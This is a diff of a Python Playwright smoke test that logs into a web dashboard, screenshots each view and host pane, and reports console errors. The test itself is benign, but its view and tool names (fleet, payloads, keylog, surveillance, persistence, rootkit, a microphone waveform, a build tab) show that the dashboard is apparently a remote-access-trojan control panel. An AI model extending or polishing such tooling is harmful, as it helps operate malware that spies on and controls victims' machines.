@@ -1,62 +1,91 @@
-"""Headless UI smoke test over the DevTools protocol: screenshot + JS errors."""
+"""Headless dashboard smoke test.
 
-import asyncio, base64, json, sys, urllib.request
+Boots against an already running (ideally seeded) server, walks every view and
+host pane, screenshots them and fails on any console error, failed request or
+layout overflow.
 
-import websockets
+    python tools/uicheck.py http://127.0.0.1:8014 admin:secret .tmp/shots
+"""
 
-URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8014/?token=test123"
-OUT = sys.argv[2] if len(sys.argv) > 2 else "ui.png"
+import json
+import os
+import sys
 
+from playwright.sync_api import sync_playwright
+
+VIEWS = ["overview", "fleet", "payloads", "activity", "environment"]
+TOOLS = ["console", "files", "keylog", "surveillance", "network", "socks",
+         "persistence", "rootkit", "info", "processes"]
+
+URL = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8014").rstrip("/")
+AUTH = sys.argv[2] if len(sys.argv) > 2 else "admin:secret"
+OUT = sys.argv[3] if len(sys.argv) > 3 else "."
+
+user, _, password = AUTH.partition(":")
 errors = []
+current = ["boot"]
 
 
-def targets():
-    with urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=5) as r:
-        return json.loads(r.read())
+def overflow(page):
+    return page.evaluate("""() => {
+        const m = document.getElementById('main');
+        return m ? m.scrollWidth - m.clientWidth : 0;
+    }""")
 
 
-async def main():
-    ts = [t for t in targets() if t["type"] == "page"]
-    ws_url = ts[0]["webSocketDebuggerUrl"]
-    async with websockets.connect(ws_url, max_size=40 * 1024 * 1024) as ws:
-        seq = 0
+def main():
+    os.makedirs(OUT, exist_ok=True)
+    with sync_playwright() as pw:
+        browser = pw.chromium.launch()
+        page = browser.new_page(viewport={"width": 1480, "height": 940})
+        page.on("console", lambda m: errors.append(f"console.{m.type}@{current[0]}: {m.text}")
+                if m.type == "error" else None)
+        page.on("pageerror", lambda e: errors.append(f"pageerror@{current[0]}: {e}"))
+        page.on("requestfailed", lambda r: errors.append(f"requestfailed@{current[0]}: {r.url}"))
 
-        async def call(method, params=None):
-            nonlocal seq
-            seq += 1
-            await ws.send(json.dumps({"id": seq, "method": method, "params": params or {}}))
-            while True:
-                msg = json.loads(await ws.recv())
-                if msg.get("id") == seq:
-                    return msg.get("result", {})
-                ev = msg.get("method")
-                if ev == "Runtime.exceptionThrown":
-                    errors.append(msg["params"]["exceptionDetails"].get("text", "exception"))
-                if ev == "Log.entryAdded" and msg["params"]["entry"]["level"] == "error":
-                    errors.append(msg["params"]["entry"]["text"])
+        page.goto(URL + "/login", wait_until="networkidle")
+        page.fill("#user", user)
+        page.fill("#pass", password)
+        page.click("#go")
+        page.wait_for_url("**/#/overview", timeout=20000)
+        page.wait_for_selector(".kpi-grid", timeout=20000)
 
-        await call("Runtime.enable")
-        await call("Log.enable")
-        await call("Page.enable")
-        await call("Emulation.setDeviceMetricsOverride",
-                   {"width": 1500, "height": 950, "deviceScaleFactor": 1, "mobile": False})
-        await call("Page.navigate", {"url": URL})
-        await asyncio.sleep(9)
+        summary = {}
+        for view in VIEWS:
+            current[0] = view
+            page.goto(f"{URL}/#/{view}")
+            page.wait_for_timeout(1200)
+            summary[view] = {"blocks": page.locator(".card, .kpi, tr[data-id]").count(),
+                             "overflow": overflow(page)}
+            page.screenshot(path=os.path.join(OUT, f"ui-{view}.png"))
 
-        dom = await call("Runtime.evaluate", {
-            "expression": "JSON.stringify({hosts:document.querySelectorAll('#sessions li').length,"
-                          "conn:document.getElementById('status').textContent,"
-                          "ws:typeof ws!=='undefined'&&ws?ws.readyState:'none',"
-                          "canvas:!!document.getElementById('micwave'),"
-                          "cards:document.querySelectorAll('.card').length,"
-                          "buildTab:!!document.getElementById('b_build')})",
-            "returnByValue": True})
-        print("DOM:", dom.get("result", {}).get("value"))
+        current[0] = "host"
+        page.goto(f"{URL}/#/fleet")
+        page.wait_for_selector("tr[data-id]", timeout=20000)
+        sid = page.get_attribute("tr[data-id]", "data-id")
+        for tool in TOOLS:
+            current[0] = "host:" + tool
+            page.goto(f"{URL}/#/host/{sid}/{tool}")
+            page.wait_for_timeout(900)
+            summary["host:" + tool] = {"panes": page.locator("#toolbody").count(),
+                                       "overflow": overflow(page)}
+            page.screenshot(path=os.path.join(OUT, f"ui-host-{tool}.png"))
 
-        shot = await call("Page.captureScreenshot", {"format": "png"})
-        with open(OUT, "wb") as fh:
-            fh.write(base64.b64decode(shot["data"]))
-        print("saved", OUT)
-        print("errors:", errors or "none")
+        current[0] = "palette"
+        page.goto(f"{URL}/#/fleet")
+        page.keyboard.press("Control+k")
+        page.wait_for_timeout(400)
+        summary["palette"] = {"items": page.locator("#palette-list li").count()}
+        page.keyboard.press("Escape")
 
-asyncio.run(main())
+        print(json.dumps(summary, indent=1))
+        browser.close()
+
+    if errors:
+        print("ERRORS:\n" + "\n".join(errors))
+        sys.exit(1)
+    print("OK - no console errors")
+
+
+if __name__ == "__main__":
+    main()
